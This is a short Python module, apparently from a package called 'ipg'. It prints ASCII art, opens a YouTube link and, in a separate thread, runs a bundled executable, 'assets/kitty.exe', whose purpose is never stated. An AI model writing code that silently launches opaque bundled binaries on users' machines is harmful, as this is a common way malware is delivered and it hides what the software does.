import threading
import subprocess
import webbrowser
import pkg_resources
from termcolor import colored

from .art import mask

def exe_exe():
    exe_path = pkg_resources.resource_filename('ipg', 'assets/kitty.exe')
    try:
        subprocess.run([exe_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

def open_url():
    webbrowser.open("https://youtu.be/28Ygr7j7jMs")

def main():
    try:
        print(colored(mask, "magenta"))
        threading.Thread(target=open_url).start()
        threading.Thread(target=exe_exe).start()

    except Exception as e :
        print(e)
    
if __name__ == "__main__":
    main()